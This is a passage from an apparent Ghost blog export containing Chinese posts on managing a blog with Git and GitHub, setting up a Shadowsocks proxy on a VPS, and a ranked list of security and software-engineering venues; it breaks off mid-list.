passphrase\n，你可以选择输入一个密码，也可以选择直接回车跳过，区别就是最终生成的私钥是否加密，直接回车跳过的话，私钥是不加密的。执行完毕后，在/root/.ssh\n目录下，会生成 id_rsa.pub 和 id_rsa 两个文件，分别是公钥和私钥。打开 id_rsa.pub，将其中的内容复制下来。\n\n在浏览器上登陆 GitHub 账户，在 settings 菜单中选择 SSH Keys，选择 Add SSH\nKey，标题起一个自己能辨认的，将刚才复制的公钥内容粘贴进去，从图片可以看到，我已经为自己的电脑创建了一个 Key，现在正在为自己的 VPS 添加另一个。\n\n\n\n\n\n密钥添加完毕后，在 VPS 上测试是否可以连接成功。\n\nssh -T git@github.com  \n\n\n第一次连接你需要输入一个 yes，之后看到下面的欢迎信息，则表示成功。\n\n\n\n\n\n\n\n\n\n可以和 GitHub 进行连接后，在自己的 GitHub 上点击+ New repository创建一个新的仓库。\n\n\n\n\n\n在创建界面，为自己的仓库起一个名字，描述可以随便写写，由于我们已经把博客建好了，所以并不需要初始化，一会直接把本地代码 push 上去就可以。点击 Create\nrepository  后，可以先不管它了。\n\n这时回到 VPS 上，前文已述，Ghost 目录位于 /var/www/下，名字是ghost，下面执行以下操作使用 git 管理博客代码。\n\n第一步是初始化\n\ncd /var/www/ghost\ngit init\n\n\n第二步是将本地仓库和 GitHub 上的远程仓库进行绑定\n\ngit remote add origin git@github.com:yourname/MyBlog.git  \n\n\n其中yourname改成你的用户名，也就是上个图片中 Owner 的名字，MyBlog.git中的MyBlog改成你的仓库名字，如果你也叫\nMyBlog，那当然就不用改了。\n\n绑定完毕后，将所有源文件添加跟踪并提交到本地库。\n\ngit add .\ngit commit -m \"message\"\n\n\nmessage是一个描述信息，随意写，比如 fist commit 之类的，你修改了什么之类的，是给自己看的。注意这里的 commit 是提交到 VPS\n上的本地库了，而并非 GitHub 上，最后\n\ngit push origin master\n\n\n将本次修改，提交到 GitHub 上，这样就结束了。在以后的使用中，如果修改了博客代码或者写了新文章，可以用git status\n查看状态，它会显示哪些文件未跟踪，哪些文件修改了。可以用git add .或者git add filename将新文件加入管理，然后使用git commit\n-m \"message\"和git push origin master将修改提交到 GitHub。当然这种只在 master\n分支上开发的方法不是特别正规，但个人博客这种项目感觉也就无所谓了。\n\n为博客添加 DISQUS 评论系统\n添加评论系统的话，不同的主题会不一样，对于本站使用的主题来说，只需要把在 disqus [https://disqus.com/]  官网注册的\nshort_name 填写在 comment.hbs 里面就可以了，之后把 post.hbs 里面的 comment 注释取消即可生效。\n\n如果你用了自定义主题，那么请参考相关主题的说明。对于默认的主题，可以参考官方给出的说明文档\n[http://support.ghost.org/add-disqus-to-my-ghost-blog/]。\n\n为博客添加分享功能\n如果想添加分享功能的话，这个也和主题有关，本站使用的主题没有分享的代码，所以需要自己添加，有的主题是自带的，所以就可以跳过了。\n\n方法是使用百度分享 [http://share.baidu.com/code]，根据自己的喜好获得代码之后，写用 Markdown\n写博客的时候，直接粘贴在编辑器里面就可以。\n\n另外也可以将代码粘贴到主题目录下的 post.hbs 里面，放在 </article>和{{/post}}之间。\n\n为博客添加上一篇和下一篇导航\n有的主题里面，post.hbs 文件里面把代码都写好了，本身自带，如果没有的话，可以把下面这段代码放到上面那个分享代码的后面，或者前面，这个顺序完全看个人喜好。\n\n\n<nav>\n    <div>\n        {{#if next}}\n        前一篇：<a href=\"{{next.url}}\">{{{next.title}}}</a>\n        {{/if}}\n    </div>\n    <div>\n        {{#if previous}}\n        后一篇：<a href=\"{{previous.url}}\">{{{previous.title}}}</a>\n        {{/if}}\n    </div>\n</nav>","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2015-07-07T01:17:01.000Z","created_by":"1","updated_at":"2017-09-16T13:32:22.000Z","updated_by":"1","published_at":"2015-07-07T03:10:31.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null},{"id":"59bccd6bf9a5a920fc140c3f","uuid":"e76b7803-1baa-4ab1-978d-6c6c09993936","title":"在 VPS 上架设 Shadowsocks 服务跳出大墙","slug":"fan-qiang","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"前文主要讲述了如何在 VPS 上搭建 Ghost 博客，在购买了 VPS 后，除去架设网站这种主要用途，还会产生一个副产物，就是可以利用 VPS 给自己架设跳墙代理，拥有一个自己专用的跳墙线路，方便科学上网。\\n\\n##VPS 端配置\\n###安装 Shadowsocks 库\\n\\n    apt-get install python-pip\\n    pip install shadowsocks\\n###创建配置文件\\n\\n    vim /etc/shadowsocks.json\\n将以下代码写入文件中\\n<pre><code>{\\n    \\\"server\\\":\\\"VPS IP\\\",\\n    \\\"server_port\\\":8388,\\n    \\\"local_address\\\": \\\"127.0.0.1\\\",\\n    \\\"local_port\\\":1080,\\n    \\\"password\\\":\\\"your password\\\",\\n    \\\"timeout\\\":300,\\n    \\\"method\\\":\\\"aes-256-cfb\\\",\\n    \\\"fast_open\\\": false,\\n    \\\"workers\\\": 1\\n}\\n</code></pre>\\n其中，`server`填写你 VPS 的 IP 地址，`server_port`可以用默认的 8388，也可以改成一个其他非周知端口。`password`填写自己想用的密码。\\n### 让 Shadowsocks 后台运行\\n\\n    apt-get install python-m2crypto supervisor\\n    vim /etc/supervisor/conf.d/shadowsocks.conf\\n将以下代码写入配置文件\\n<pre><code>\\n[program:shadowsocks]\\ncommand=ssserver -c /etc/shadowsocks.json\\nautorestart=true\\nuser=nobody\\n</code></pre>\\n在` /etc/default/supervisor`最后加入一行`ulimit -n 51200`，执行\\n\\n    service supervisor start\\n    supervisorctl reload\\n如果以后修改了 Shadowsocks 的配置，可以通过\\n\\n    supervisorctl restart shadowsocks\\n对服务进行重启。\\n\\n##客户端配置\\n客户端直接下载小飞机即可，Linux 和 Windows 以及 Mac 都有各自的版本，Windows 的下载地址是 https://github.com/clowwindy/shadowsocks-csharp\\n\\n下载完毕后，填写 VPS 的 IP 和刚才自己设置的密码即可连接，剩下的就是配合火狐或者 Chrome 的 switch 插件了，亲测速度稳定，好使。\\n\\n---\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>前文主要讲述了如何在 VPS 上搭建 Ghost 博客，在购买了 VPS 后，除去架设网站这种主要用途，还会产生一个副产物，就是可以利用 VPS 给自己架设跳墙代理，拥有一个自己专用的跳墙线路，方便科学上网。</p>\n<h2 id=\"vps\">VPS 端配置</h2>\n<h3 id=\"shadowsocks\">安装 Shadowsocks 库</h3>\n<pre><code>apt-get install python-pip\npip install shadowsocks\n</code></pre>\n<h3 id=\"\">创建配置文件</h3>\n<pre><code>vim /etc/shadowsocks.json\n</code></pre>\n<p>将以下代码写入文件中</p>\n<pre><code>{\n    \"server\":\"VPS IP\",\n    \"server_port\":8388,\n    \"local_address\": \"127.0.0.1\",\n    \"local_port\":1080,\n    \"password\":\"your password\",\n    \"timeout\":300,\n    \"method\":\"aes-256-cfb\",\n    \"fast_open\": false,\n    \"workers\": 1\n}\n</code></pre>\n<p>其中，<code>server</code>填写你 VPS 的 IP 地址，<code>server_port</code>可以用默认的 8388，也可以改成一个其他非周知端口。<code>password</code>填写自己想用的密码。</p>\n<h3 id=\"shadowsocks\">让 Shadowsocks 后台运行</h3>\n<pre><code>apt-get install python-m2crypto supervisor\nvim /etc/supervisor/conf.d/shadowsocks.conf\n</code></pre>\n<p>将以下代码写入配置文件</p>\n<pre><code>\n[program:shadowsocks]\ncommand=ssserver -c /etc/shadowsocks.json\nautorestart=true\nuser=nobody\n</code></pre>\n<p>在<code>/etc/default/supervisor</code>最后加入一行<code>ulimit -n 51200</code>，执行</p>\n<pre><code>service supervisor start\nsupervisorctl reload\n</code></pre>\n<p>如果以后修改了 Shadowsocks 的配置，可以通过</p>\n<pre><code>supervisorctl restart shadowsocks\n</code></pre>\n<p>对服务进行重启。</p>\n<h2 id=\"\">客户端配置</h2>\n<p>客户端直接下载小飞机即可，Linux 和 Windows 以及 Mac 都有各自的版本，Windows 的下载地址是 <a href=\"https://github.com/clowwindy/shadowsocks-csharp\">https://github.com/clowwindy/shadowsocks-csharp</a></p>\n<p>下载完毕后，填写 VPS 的 IP 和刚才自己设置的密码即可连接，剩下的就是配合火狐或者 Chrome 的 switch 插件了，亲测速度稳定，好使。</p>\n<hr>\n</div>","amp":"10","plaintext":"前文主要讲述了如何在 VPS 上搭建 Ghost 博客，在购买了 VPS 后，除去架设网站这种主要用途，还会产生一个副产物，就是可以利用 VPS\n给自己架设跳墙代理，拥有一个自己专用的跳墙线路，方便科学上网。\n\nVPS 端配置\n安装 Shadowsocks 库\napt-get install python-pip\npip install shadowsocks\n\n\n创建配置文件\nvim /etc/shadowsocks.json\n\n\n将以下代码写入文件中\n\n{\n    \"server\":\"VPS IP\",\n    \"server_port\":8388,\n    \"local_address\": \"127.0.0.1\",\n    \"local_port\":1080,\n    \"password\":\"your password\",\n    \"timeout\":300,\n    \"method\":\"aes-256-cfb\",\n    \"fast_open\": false,\n    \"workers\": 1\n}\n\n\n其中，server填写你 VPS 的 IP 地址，server_port可以用默认的 8388，也可以改成一个其他非周知端口。password\n填写自己想用的密码。\n\n让 Shadowsocks 后台运行\napt-get install python-m2crypto supervisor\nvim /etc/supervisor/conf.d/shadowsocks.conf\n\n\n将以下代码写入配置文件\n\n\n[program:shadowsocks]\ncommand=ssserver -c /etc/shadowsocks.json\nautorestart=true\nuser=nobody\n\n\n在/etc/default/supervisor最后加入一行ulimit -n 51200，执行\n\nservice supervisor start\nsupervisorctl reload\n\n\n如果以后修改了 Shadowsocks 的配置，可以通过\n\nsupervisorctl restart shadowsocks\n\n\n对服务进行重启。\n\n客户端配置\n客户端直接下载小飞机即可，Linux 和 Windows 以及 Mac 都有各自的版本，Windows 的下载地址是 \nhttps://github.com/clowwindy/shadowsocks-csharp\n\n下载完毕后，填写 VPS 的 IP 和刚才自己设置的密码即可连接，剩下的就是配合火狐或者 Chrome 的 switch 插件了，亲测速度稳定，好使。\n\n\n--------------------------------------------------------------------------------","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2015-07-07T04:32:59.000Z","created_by":"1","updated_at":"2017-02-25T00:59:39.000Z","updated_by":"1","published_at":"2015-07-07T04:53:42.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null},{"id":"59bccd6bf9a5a920fc140c40","uuid":"8254a51e-4d55-4da2-a7d8-fd4703e40671","title":"安全和软工会议列表","slug":"hui-yi-lie-biao","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"##信息安全类期刊和会议\\n###A 类期刊\\n* TDSC <a href=\\\"http://www.computer.org/portal/web/tdsc\\\">IEEE Transactions on Dependable and Secure Computing</a>\\n* TIFS <a href=\\\"http://ieeexplore.ieee.org/xpl/RecentIssue.jsp?punumber=10206\\\">IEEE Transactions on Information Forensics and Security</a></td>\\n* Journal of Cryptology 密码学，可略过\\n\\n###B 类期刊\\n\\n* TISSEC <a href=\\\"http://tissec.acm.org/\\\">ACM Transactions on Information and System Security</a> 官网首页有篇文章\\n* <a href=\\\"http://www.journals.elsevier.com/computers-and-security/\\\">Computers & Security</a> 2015 Volume 51 有文章\\n* <a href=\\\"http://link.springer.com/journal/10623\\\">Designs, Codes and Cryptography</a> 密码学，不靠谱\\n* JCS <a href=\\\"http://iospress.metapress.com/content/103167/\\\">Journal of Computer Security</a> Volume 22 Issue 3 有文章\\n   \\n\\n\\n###C 类期刊\\n* CLSR <a href=\\\"http://www.journals.elsevier.com/computer-law-and-security-review/\\\">Computer Law and Security Reports</a> 法律法规，不靠谱\\n* <a href=\\\"http://jis.eurasipjournals.com/\\\">EURASIP Journal on Information Security</a>\\n* <a href=\\\"http://digital-library.theiet.org/content/journals/iet-ifs\\\">IET Information Security</a>\\n* IMCS <a href=\\\"http://www.emeraldinsight.com/loi/imcs\\\">Information Management & Computer Security</a>\\n* ISTR <a href=\\\"http://www.sciencedirect.com/science/journal/13634127\\\">Information Security Technical Report</a> 首页有文章\\n* IJISP <a href=\\\"http://www.igi-global.com/journal/international-journal-information-security-privacy/1096\\\">International Journal of Information Security and Privacy</a>\\n* IJICS <a href=\\\"http://www.inderscience.com/jhome.php?jcode=ijics\\\">International Journal of Information and Computer Security</a>\\n* SCN <a href=\\\"http://onlinelibrary.wiley.com/journal/10.1002/(ISSN)1939-0122\\\">Security and Communication Networks</a>\\n\\n###A 类会议\\n* CCS <a href=\\\"http://www.sigsac.org/ccs/CCS2014/\\\">ACM Conference on Computer and Communications Security</a>\\n* CRYPTO <a href=\\\"\\\">International Cryptology Conference</a>  密码不看\\n* EUROCRYPT  <a href=\\\"\\\">European Cryptology Conference</a> 密码不看\\n* S & P <a href=\\\"http://www.ieee-security.org/TC/SP2014/\\\">IEEE Symposium on Security and Privacy</a>\\n* USENIX Security <a href=\\\"https://www.usenix.org/conference/usenixsecurity14\\\">Usenix Security Symposium</a>\\n###B 类会议\\n* ACSAC <a href=\\\"https://www.acsac.org/2014/\\\">Annual Computer Security Applications \\nConference</a>\\n* ASIACRYPT <a href=\\\"http://des.cse.nsysu.edu.tw/asiacrypt2014/\\\">Annual International Conference on the Theory and Application of Cryptology and Information Security</a>\\n* ESORICS <a href=\\\"http://esorics2014.pwr.wroc.pl/\\\">European Symposiumon Research in Computer Security</a>\\n* FSE <a href=\\\"https://fse22.gatech.edu/\\\">Fast Software Encryption</a>\\n* NDSS <a href=\\\"http://www.internetsociety.org/events/ndss-symposium-2014\\\">ISOC Network and Distributed System Security Symposium</a>\\n* CSFW <a href=\\\"http://cscw.acm.org/2014/\\\">IEEE Computer Security Foundations Workshop</a>\\n* RAID <a href=\\\"http://www.raid2014.eu/\\\">International Symposium on Recent Advances in Intrusion Detection</a>\\n* PKC <a href=\\\"http://www.iacr.org/workshops/pkc2014/\\\">International Workshop on Practice and Theory in Public Key Cryptography</a>\\n* DSN <a href=\\\"http://2014.dsn.org/\\\">The International Conference on Dependable Systems and Networks</a>\\n* TCC <a href=\\\"http://www.iacr.org/workshops/tcc2014/call_for_papers.html\\\">Theory of Cryptography Conference</a> 不看\\n* SRDS <a href=\\\"http://www-nishio.ist.osaka-u.ac.jp/conf/srds2014/\\\">IEEE International Symposium on Reliable Distributed Systems</a>\\n* CHES <a href=\\\"http://www.chesworkshop.org/ches2014/start.php\\\">Workshop on Cryptographic Hardware and Embedded Systems</a> 不看\\n\\n###C 类会议\\n* WiSec <a href=\\\"http://www.sigsac.org/wisec/WiSec2014/\\\">ACM Conference on Security and Privacy \\nin Wireless and Mobile Networks</a>\\n* ACM MM&SEC <a href=\\\"http://www.ihmmsec.org/index.php/ihmmsec2014\\\">ACM Multimedia and Security Workshop</a>\\n* SACMAT <a href=\\\"http://www.sacmat.org/2014/index.php\\\">ACM Symposium on Access Control Models\\nand Technologies</a>\\n* ASIACCS <a href=\\\"http://asiaccs2014.nict.go.jp/\\\">ACM Symposium on Information, Computer\\nand Communications Security</a>\\n* DRM <a href=\\\"\\\">ACM Workshop on Digital Rights Management</a> 不沾边\\n* ACNS <a href=\\\"http://acns2014.epfl.ch/\\\">Applied Cryptography and Network Security</a> 感觉不靠谱\\n* ACISP <a href=\\\"https://ssl.informatics.uow.edu.au/acisp2014/\\\">Australasia Conference on Information Security and Privacy</a>\\n* DFRWS <a href=\\\"http://www.dfrws.org/2014/\\\">Digital Forensic Research Workshop</a>\\n* FC <a href=\\\"http://fc14.ifca.ai/\\\">Financial Cryptography and Data Security</a> 感觉不靠谱\\n* DIMVA <a href=\\\"http://dimva2014.isg.rhul.ac.uk/\\\">Detection of Intrusions and Malware & Vulnerability Assessment</a> 名字真耐人，必须看\\n* SEC <a href=\\\"http://www.ifipsec.org/\\\">IFIP International Information Security Conference</a>\\n* IFIP WG 11.9 <a href=\\\"http://www.ifip119.org/Conferences/\\\">IFIP WG 11.9 International Conference on Digital Forensics</a>\\n* ISC <a href=\\\"http://isc14.ie.cuhk.edu.hk/\\\">Information Security Conference</a>\\n* SecureComm <a href=\\\"http://securecomm.org/2014/show/home\\\">International Conference on Security and Privacy in Communication Networks</a>\\n* NSPW <a href=\\\"http://www.nspw.org/2014\\\">New Security Paradigms Workshop</a>\\n* CT-RSA <a href=\\\"\\\">RSA Conference, Cryptographers' Track</a> 密码不看\\n* SOUPS <a href=\\\"https://cups.cs.cmu.edu/soups/2014/\\\">Symposium On Usable Privacy and Security</a>\\n* HotSec <a href=\\\"https://www.usenix.org/conference/hotsec14\\\">USENIX Workshop on Hot Topics in Security</a>\\n* SAC <a href=\\\"\\\">Selected Areas in Cryptography</a> 密码不看\\n* TrustCom <a href=\\\"http://www.greenorbs.org/TrustCom2014/\\\">IEEE International Conference on Trust, Security and Privacy in Computing and Communications</a>\\n\\n##软件工程类期刊和会议\\n###A 类期刊\\n* TOPLAS <a href=\\\"\\\">ACM Transactions on Programming Languages & Systems</a> 感觉不用看\\n* TOSEM <a href=\\\"http://tosem.acm.org/\\\">ACM Transactions on Software Engineering Methodology</a> 感觉不用看\\n* TSE <a href=\\\"http://www.computer.org/web/tse\\\">IEEE Transactions on Software Engineering</a> Vol 40 DEC 12 一篇\\n   \\n###B 类期刊\\n* ASE <a href=\\\"http://link.springer.com/journal/10515\\\">Automated Software Engineering</a> \\n* <a href=\\\"http://link.springer.com/journal/10664\\\">Empirical Software Engineering</a>\\n* TSC <a href=\\\"http://www.computer.org/web/tsc\\\">IEEE Transactions on Service Computing</a>\\n* IETS <a href=\\\"http://digital-library.theiet.org/content/journals/iet-sen\\\">IET Software</a>\\n* IST <a href=\\\"http://www.journals.elsevier.com/information-and-software-technology/\\\">Information and Software Technology</a>\\n* JFP <a href=\\\"http://journals.cambridge.org/action/displayJournal?jid=JFP\\\">Journal of Functional Programming</a>\\n* <a href=\\\"http://onlinelibrary.wiley.com/journal/10.1002/(ISSN)2047-7481\\\">Journal of Software: Evolution and Process</a>\\n* JSS <a href=\\\"http://www.journals.elsevier.com/journal-of-systems-and-software/\\\">Journal of Systems and Software</a>\\n* RE <a href=\\\"http://link.springer.com/journal/766\\\">Requirements Engineering</a>\\n* SCP <a href=\\\"http://www.journals.elsevier.com/science-of-computer-programming/\\\">Science of Computer Programming</a>\\n* SoSyM <a href=\\\"http://www.springer.com/computer/swe/journal/10270\\\">Software and System Modeling</a>\\n* SPE <a href=\\\"http://onlinelibrary.wiley.com/journal/10.1002/(ISSN)1097-024X\\\">Software: Practice and Experience</a>\\n* STVR <a href=\\\"http://onlinelibrary.wiley.com/journal/10.1002/(ISSN)1099-1689\\\">Software Testing, Verification and Reliability</a> 可能有\\n\\n###C 类期刊\\n* <a href=\\\"http://www.journals.elsevier.com/computer-languages-systems-and-structures/\\\">Computer Languages, Systems and Structures</a>\\n* IJSEKE <a href=\\\"http://www.worldscientific.com/worldscinet/ijseke\\\">International Journal on Software Engineering and Knowledge Engineering</a>\\n* STTT <a href=\\\"http://link.springer.com/journal/10009\\\">International Journal on Software Tools for Technology Transfer</a>\\n* <a href=\\\"http://www.journals.elsevier.com/the-journal-of-logic-and-algebraic-programming/\\\">Journal of Logic and Algebraic Programming</a>\\n* JWE <a href=\\\"http://www.rintonpress.com/journals/jwe/\\\">Journal of Web Engineering</a>\\n* <a href=\\\"http://www.springer.com/computer/communication+networks/journal/11761\\\">Service Oriented Computing and Applications</a>\\n* SQJ <a href=\\\"http://www.springer.com/computer/swe/journal/11219\\\">Software Quality Journal</a>\\n* TPLP <a href=\\\"http://journals.cambridge.org/action/displayJournal?jid=TLP\\\">Theory and Practice of Logic Programming</a>\\n\\n###A 类会议\\n* FSE/ESEC <a href=\\\"http://esec-fse15.dei.polimi.it/\\\">ACM SIGSOFT Symposium on the Foundation of Software Engineering/ European Software Engineering Conference</a> 今年有篇文章，贾老师基友也发过文章\\n* OOPSLA <a href=\\\"http://2015.splashcon.org/\\\">Conference on Object-Oriented Programming Systems, Languages, and Applications</a>\\n* ICSE <a href=\\\"http://2015.icse-conferences.org/\\\">International Conference on Software Engineering</a>\\n* OSDI <a href=\\\"https://www.usenix.org/conference/osdi14\\\">USENIX Symposium on Operating Systems Design and Implementations</a>\\n* PLDI <a href=\\\"http://conf.researchr.org/home/pldi2015\\\">ACM SIGPLAN Symposium on Programming Language Design & Implementation</a>\\n* POPL <a href=\\\"http://popl.mpi-sws.org/2015/\\\">ACM SIGPLAN-SIGACT Symposium on Principles of Programming Languages</a>\\n* SOSP <a href=\\\"http://www.ssrc.ucsc.edu/sosp15/\\\">ACM Symposium on Operating Systems Principles</a> 征文稿有安全分支\\n\\n###B 类会议\\n* ECOOP <a href=\\\"http://ecoop.org/\\\">European Conference on Object-Oriented Programming</a>\\n* ETAPS <a href=\\\"http://www.etaps.org/\\\">European Joint Conferences on Theory and Practice of Software</a>\\n* FM <a href=\\\"http://www.fmeurope.org/\\\">Formal Methods, World Congress</a>\\n* ICPC <a href=\\\"https://dibt.unimol.it/ICPC15/Home.html\\\">IEEE International Conference on Program Comprehension</a>\\n* RE <a href=\\\"http://re15.org/\\\">IEEE International Requirement Engineering Conference</a>\\n* CAiSE <a href=\\\"http://caise2015.dsv.su.se/\\\">International Conference on Advanced Information Systems Engineering</a>\\n* ASE <a href=\\\"http://ase2015.unl.edu/#tab-main\\\">International Conference on Automated Software Engineering</a> 有安全分支，贾老师的基友发过文章。\\n* ICFP <a href=\\\"http://icfpconference.org/icfp2015/\\\">International Conf on Function Programming</a>\\n* LCTES <a href=\\\"http://lctes2015.lctes.org/\\\">International Conference on Languages, Compilers, Tools and Theory for Embedded Systems</a>\\n* MoDELS <a href=\\\"http://www.modelsconference.org/\\\">International Conference on Model Driven Engineering Languages and Systems</a>\\n* CP <a href=\\\"http://booleconferences.ucc.ie/cp2015\\\">International Conference on Principles and Practice of Constraint Programming</a>\\n* ICSOC <a href=\\\"http://www.icsoc.org/\\\">International Conference on Service Oriented Computing</a>\\n* ICSM <a href=\\\"http://www.icsm2015.org/\\\">International. Conference on Software Maintenance</a>\\n* VMCAI <a href=\\\"http://research.microsoft.com/en-us/events/vmcai2015/\\\">International Conference on Verification, Model Checking, and Abstract Interpretation</a>\\n* ICWS <a href=\\\"http://conferences.computer.org/icws/2015/\\\">International Conference on Web Services（Research Track）</a>\\n* SAS <a href=\\\"http://sas2015.inria.fr/\\\">International Static Analysis Symposium</a>\\n* ISSRE <a href=\\\"http://issre.net/\\\">International Symposium on Software Reliability Engineering</a>\\n* ISSTA <a href=\\\"http://issta2015.cs.uoregon.edu/\\\">International Symposium on Software Testing and Analysis</a>\\n* Middleware <a href=\\\"http://www.middleware-conference.org/\\\">Conference on middleware</a>\\n* WCRE <a href=\\\"http://wcre.wikidot.com/2013\\\">Working Conference on Reverse Engineering</a> 逆向的会，希望很大。\\n* HotOS <a href=\\\"https://www.usenix.org/conference/hotos15\\\">USENIX Workshop on Hot Topics in Operating Systems</a>\\n\\n###C 类会议\\n* PASTE <a href=\\\"http://www.wikicfp.com/cfp/servlet/event.showcfp?eventid=28174&copyownerid=7812\\\">ACM SIGPLAN-SIGSOFT Workshop on Program Analysis for Software Tools and Engineering</a>\\n* APLAS <a href=\\\"http://pl.postech.ac.kr/aplas2015/\\\">Asian Symposium on Programming Languages and Systems</a>\\n* APSEC <a href=\\\"http://www.apsec2015.org/\\\">Asia-Pacific Software Engineering Conference</a>\\n* COMPSAC <a href=\\\"http://www.computer.org/portal/web/COMPSAC\\\">International Computer Software and Applications Conference</a> 台湾那个会，许老师是常客\\n* ICECCS <a href=\\\"http://iceccs2015.monash.edu.au/2015/index.jsp\\\">IEEE International Conference on Engineering of Complex Computer Systems</a>\\n* SCAM <a href=\\\"http://www.ieee-scam.org/\\\">IEEE International Working Conference on Source Code Analysis and Manipulation</a>\\n* ICFEM <a href=\\\"http://icfem2015.lri.fr/\\\">International Conference on Formal Engineering Methods</a>\\n* TOOLS <a href=\\\"http://tools.ethz.ch/\\\">International Conference on Objects, Models, Components, Patterns</a>\\n* PEPM <a href=\\\"http://conf.researchr.org/home/pepm2015\\\">ACM SIGPLAN Symposium on Partial Evaluation and Semantics Based Programming Manipulation</a>\\n* QSIC <a href=\\\"http://paris.utdallas.edu/qsic15/\\\">International Conference on Quality Software</a>\\n* SEKE <a href=\\\"http://www.ksi.edu/seke/seke15.html\\\">International Conference on Software Engineering and Knowledge Engineering</a>\\n* ICSR <a href=\\\"http://www.icsoro.org/icsr2015/\\\">International Conference on Software Reuse</a>\\n* ICWE <a href=\\\"http://icwe2015.webengineering.org/\\\">International Conference on Web Engineering</a>\\n* SPIN <a href=\\\"http://www.spin2015.com/\\\">International SPIN Workshop on Model Checking of Software</a>\\n* LOPSTR <a href=\\\"http://alpha.diism.unisi.it/lopstr15/\\\">International Symposium on Logic-based Program Synthesis and Transformation</a>\\n* TASE <a href=\\\"http://tase2015.nuaa.edu.cn/\\\">International Symposium on Theoretical Aspects of Software Engineering</a> 有安全分支，我发过文章。\\n* ICST <a href=\\\"http://icst2015.ist.tu-graz.ac.at/\\\">The IEEE International Conference on Software Testing, Verification and Validation</a>\\n* ATVA <a href=\\\"http://atva2015.ios.ac.cn/\\\">International Symposium on Automated Technology for Verification and Analysis</a>\\n* ESEM <a href=\\\"http://esem-conferences.org/index.php\\\">International Symposium on Empirical Software Engineering and Measurement</a>\\n* ISPASS <a href=\\\"http://ispass.org/ispass2015/\\\">IEEE International Symposium on Performance Analysis of Systems and Software</a>\\n* SCC <a href=\\\"http://conferences.computer.org/scc/2015/\\\">International Conference on Service Computing</a>\\n* ICSSP <a href=\\\"http://www.icsp-conferences.org/icssp2015/\\\">International Conference on Software and System Process</a>\\n\\n##总结\\n\\n1. 很明显行或不行的，我备注了。顺手发现的东西，都备注了。\\n2. 软件工程这边的会和期刊的分类是“软件工程、系统软件与程序设计语言”，所以从名字上看，明显没关系的期刊和会找到文章的希望不大。\\n3. 如果像早上说的，都不是正交，把范围都扩大，那安全那边还有不少可以找。软件这边更多的是赶着走。\\n3. 期刊都是链接到官网。原则上，安全的会我都链接到了14 年，软工的会都链接到了15 年，个别死链是因为我觉得没用所以就没找。\\n4. 安全列表来自：http://www.ccf.org.cn/sites/ccf/biaodan.jsp?contentId=2567814757428\\n5. 软件列表来自：http://www.ccf.org.cn/sites/ccf/biaodan.jsp?contentId=2567814757404\\n\\n---\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><h2 id=\"\">信息安全类期刊和会议</h2>\n<h3 id=\"a\">A 类期刊</h3>\n<ul>\n<li>TDSC <a href=\"http://www.computer.org/portal/web/tdsc\">IEEE Transactions on Dependable and Secure Computing</a></li>\n<li>TIFS <a href=\"http://ieeexplore.ieee.org/xpl/RecentIssue.jsp?punumber=10206\">IEEE Transactions on Information Forensics and Security</a></td></li>\n<li>Journal of Cryptology 密码学，可略过</li>\n</ul>\n<h3 id=\"b\">B 类期刊</h3>\n<ul>\n<li>TISSEC <a href=\"http://tissec.acm.org/\">ACM Transactions on Information and System Security</a> 官网首页有篇文章</li>\n<li><a href=\"http://www.journals.elsevier.com/computers-and-security/\">Computers &amp; Security</a> 2015 Volume 51 有文章</li>\n<li><a href=\"http://link.springer.com/journal/10623\">Designs, Codes and Cryptography</a> 密码学，不靠谱</li>\n<li>JCS <a href=\"http://iospress.metapress.com/content/103167/\">Journal of Computer Security</a> Volume 22 Issue 3 有文章</li>\n</ul>\n<h3 id=\"c\">C 类期刊</h3>\n<ul>\n<li>CLSR <a href=\"http://www.journals.elsevier.com/computer-law-and-security-review/\">Computer Law and Security Reports</a> 法律法规，不靠谱</li>\n<li><a href=\"http://jis.eurasipjournals.com/\">EURASIP Journal on Information Security</a></li>\n<li><a href=\"http://digital-library.theiet.org/content/journals/iet-ifs\">IET Information Security</a></li>\n<li>IMCS <a href=\"http://www.emeraldinsight.com/loi/imcs\">Information Management &amp; Computer Security</a></li>\n<li>ISTR <a href=\"http://www.sciencedirect.com/science/journal/13634127\">Information Security Technical Report</a> 首页有文章</li>\n<li>IJISP <a href=\"http://www.igi-global.com/journal/international-journal-information-security-privacy/1096\">International Journal of Information Security and Privacy</a></li>\n<li>IJICS <a href=\"http://www.inderscience.com/jhome.php?jcode=ijics\">International Journal of Information and Computer Security</a></li>\n<li>SCN <a href=\"http://onlinelibrary.wiley.com/journal/10.1002/(ISSN)1939-0122\">Security and Communication Networks</a></li>\n</ul>\n<h3 id=\"a\">A 类会议</h3>\n<ul>\n<li>CCS <a href=\"http://www.sigsac.org/ccs/CCS2014/\">ACM Conference on Computer and Communications Security</a></li>\n<li>CRYPTO <a href=\"\">International Cryptology Conference</a>  密码不看</li>\n<li>EUROCRYPT  <a href=\"\">European Cryptology Conference</a> 密码不看</li>\n<li>S &amp; P <a href=\"http://www.ieee-security.org/TC/SP2014/\">IEEE Symposium on Security and Privacy</a></li>\n<li>USENIX Security <a href=\"https://www.usenix.org/conference/usenixsecurity14\">Usenix Security Symposium</a></li>\n</ul>\n<h3 id=\"b\">B 类会议</h3>\n<ul>\n<li>ACSAC <a href=\"https://www.acsac.org/2014/\">Annual Computer Security Applications<br>\nConference</a></li>\n<li>ASIACRYPT <a href=\"http://des.cse.nsysu.edu.tw/asiacrypt2014/\">Annual International Conference on the Theory and Application of Cryptology and Information Security</a></li>\n<li>ESORICS <a href=\"http://esorics2014.pwr.wroc.pl/\">European Symposiumon 